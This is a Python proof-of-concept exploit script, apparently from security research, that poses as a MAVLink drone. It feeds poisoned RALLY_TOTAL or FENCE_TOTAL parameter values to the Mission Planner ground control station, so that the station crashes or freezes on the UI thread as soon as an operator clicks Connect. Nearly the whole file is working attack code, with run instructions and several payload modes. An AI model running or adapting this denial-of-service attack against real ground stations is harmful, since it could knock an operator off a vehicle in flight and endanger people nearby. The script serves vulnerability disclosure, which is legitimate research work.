#!/usr/bin/env python3
r"""
poc_MP04_param_total_connect_dos.py
================================================================================
Finding ID : MP-04
Target GCS : Mission Planner (Windows / .NET)
Severity   : MEDIUM (zero-click connect-time DoS); A:H for the O(n^2) hang variant
Class      : CWE-248 uncaught exception / CWE-20 input validation (+ CWE-1050 O(n^2))

WHAT THIS DEMONSTRATES
----------------------
Mission Planner AUTOMATICALLY downloads the parameter list on connect and then, on the
UI thread, runs:

    MainV2.cs:1762-1763
        if (comPort.MAV.param.ContainsKey("RALLY_TOTAL") &&
            int.Parse(comPort.MAV.param["RALLY_TOTAL"].ToString()) > 0 && showui)

The `int.Parse` is `&&`-chained BEFORE `showui` and sits OUTSIDE the block's own try, and
MAVLinkParam.ToString() returns the raw REAL32 value (MAVLinkParam.cs:222). So a vehicle
that reports RALLY_TOTAL as a REAL32 with a non-integer / NaN / overflow value makes
int.Parse throw on the UI thread -> either a forced disconnect (doConnect catch) or MP's
"An error has occurred ... Report this Error?" modal (Application.ThreadException ->
Program.cs:791). ZERO operator interaction beyond clicking Connect.

A second variant: RALLY_TOTAL = a valid large integer -> MP auto-downloads that many rally
points and runs an O(n^2) haversine double loop on the UI thread (MainV2.cs:1771-1783) ->
Mission Planner freezes. Select it with --mode onsquared.

MODES
-----
  fifthdecimal (default) : RALLY_TOTAL = REAL32 3.5      -> FormatException
  nan                    : RALLY_TOTAL = REAL32 NaN      -> FormatException
  overflow               : RALLY_TOTAL = REAL32 1e30     -> FormatException/Overflow
  onsquared              : RALLY_TOTAL = INT 6000 (--rally N) + serve N rally points -> UI hang
  fence                  : FENCE_TOTAL = REAL32 3.5 (+ FENCE_ACTION) -> same crash via the fence branch

HOW TO RUN
----------
  pip install pymavlink
  python3 poc_MP04_param_total_connect_dos.py --listen 0.0.0.0:5760
  # Mission Planner: TCP -> 127.0.0.1:5760 -> Connect. Observe the dialog / disconnect.

SAFETY / AUTHORISATION
----------------------
Authorised white-box research only, against a Mission Planner instance you own on
localhost/bench. Benign: this only sends telemetry + a poisoned parameter value; it writes
no files and runs no code on the target.
"""
import argparse
import math
import os
import time

os.environ.setdefault("MAVLINK20", "1")
from pymavlink import mavutil
mav = mavutil.mavlink

# Baseline params that make MP treat us as a normal ArduCopter. RALLY_TOTAL/FENCE_TOTAL are
# injected per-mode below. (name, value, type)
BASE_PARAMS = [
    ("SYSID_THISMAV", 1.0, mav.MAV_PARAM_TYPE_INT8),
    ("FRAME_CLASS",   1.0, mav.MAV_PARAM_TYPE_INT8),
    ("FRAME_TYPE",    1.0, mav.MAV_PARAM_TYPE_INT8),
    ("ARMING_CHECK",  1.0, mav.MAV_PARAM_TYPE_INT32),
]

REAL32 = mav.MAV_PARAM_TYPE_REAL32
INT32 = mav.MAV_PARAM_TYPE_INT32


def build_params(args):
    """Return the list the vehicle will advertise, with the poison entry for the chosen mode."""
    params = list(BASE_PARAMS)
    if args.mode == "fifthdecimal":
        params.append(("RALLY_TOTAL", 3.5, REAL32))        # int.Parse("3.5") -> FormatException
    elif args.mode == "nan":
        params.append(("RALLY_TOTAL", float("nan"), REAL32))  # "NaN" -> FormatException
    elif args.mode == "overflow":
        params.append(("RALLY_TOTAL", 1e30, REAL32))       # "1E+30" -> Format/Overflow
    elif args.mode == "fence":
        params.append(("FENCE_TOTAL", 3.5, REAL32))        # fence branch, MainV2.cs:1801
        params.append(("FENCE_ACTION", 1.0, INT32))        # branch also requires FENCE_ACTION
    elif args.mode == "onsquared":
        params.append(("RALLY_TOTAL", float(args.rally), INT32))  # valid large int -> O(n^2)
    return params


def send_params(m, params):
    n = len(params)
    for i, (name, val, ptype) in enumerate(params):
        m.mav.param_value_send(name.encode(), float(val), ptype, n, i)


def serve_rally(m, target_sys, target_comp, count, home):
    """Answer the MISSION_REQUEST(_INT) flow for RALLY points (mission_type=2)."""
    lat, lon = home
    # spread points a little so the O(n^2) distance loop does real work
    for _ in range(200):
        msg = m.recv_match(type=["MISSION_REQUEST", "MISSION_REQUEST_INT"], blocking=True, timeout=1)
        if msg is None:
            continue
        if getattr(msg, "mission_type", 2) != 2:
            continue
        seq = msg.seq
        jitter = (seq % 1000) * 1e-4
        m.mav.mission_item_int_send(
            target_sys, target_comp, seq, mav.MAV_FRAME_GLOBAL_RELATIVE_ALT,
            mav.MAV_CMD_NAV_RALLY_POINT, 0, 1, 0, 0, 0, 0,
            int((lat + jitter) * 1e7), int((lon + jitter) * 1e7), 100.0, 2)
        if seq >= count - 1:
            break


def main():
    ap = argparse.ArgumentParser(description="MP-04 zero-click connect DoS (malicious vehicle)")
    ap.add_argument("--listen", default="0.0.0.0:5760", help="TCP listen host:port (MP connects here)")
    ap.add_argument("--mode", default="fifthdecimal",
                    choices=["fifthdecimal", "nan", "overflow", "fence", "onsquared"])
    ap.add_argument("--rally", type=int, default=6000, help="onsquared: RALLY_TOTAL / points to serve")
    args = ap.parse_args()

    conn = "tcpin:" + args.listen
    print(f"[MP-04] listening on {conn}  mode={args.mode}")
    print("[MP-04] connect Mission Planner: TCP -> " + args.listen.replace('0.0.0.0', '127.0.0.1'))
    m = mavutil.mavlink_connection(conn, source_system=1,
                                   source_component=mav.MAV_COMP_ID_AUTOPILOT1,
                                   dialect="ardupilotmega")

    params = build_params(args)
    home = (-35.363261, 149.165230)
    start = time.time()
    sent_params_to = set()
    last_hb = 0.0

    while True:
        now = time.time()
        if now - last_hb > 1.0:
            last_hb = now
            m.mav.heartbeat_send(mav.MAV_TYPE_QUADROTOR, mav.MAV_AUTOPILOT_ARDUPILOTMEGA,
                                 mav.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 0, mav.MAV_STATE_ACTIVE)

        msg = m.recv_match(blocking=False)
        if msg is None:
            time.sleep(0.005)
            continue
        t = msg.get_type()

        if t == "HEARTBEAT":
            # advertise as a plain autopilot; do NOT set the FTP capability so MP uses the
            # classic PARAM_VALUE download path (simplest, carries our poisoned REAL32).
            pass
        elif t == "COMMAND_LONG" and msg.command == mav.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES:
            m.mav.autopilot_version_send(0, 0, 0, 0, 0, [0] * 8, [0] * 8, [0] * 8, 0, 0, 0)
            m.mav.command_ack_send(msg.command, mav.MAV_RESULT_ACCEPTED)
        elif t == "PARAM_REQUEST_LIST":
            print("[MP-04] MP requested param list -> sending poisoned RALLY/FENCE_TOTAL")
            send_params(m, params)
            sent_params_to.add((msg.get_srcSystem(), msg.get_srcComponent()))
        elif t == "PARAM_REQUEST_READ":
            name = (msg.param_id if isinstance(msg.param_id, str)
                    else msg.param_id.decode(errors="ignore")).strip("\x00")
            for i, (pn, val, ptype) in enumerate(params):
                if pn == name:
                    m.mav.param_value_send(pn.encode(), float(val), ptype, len(params), i)
        elif t == "MISSION_REQUEST_LIST" and args.mode == "onsquared":
            m.mav.mission_count_send(msg.get_srcSystem(), msg.get_srcComponent(),
                                     args.rally, 2)  # rally count
        elif t in ("MISSION_REQUEST", "MISSION_REQUEST_INT") and args.mode == "onsquared":
            serve_rally(m, msg.get_srcSystem(), msg.get_srcComponent(), args.rally, home)


if __name__ == "__main__":
    main()
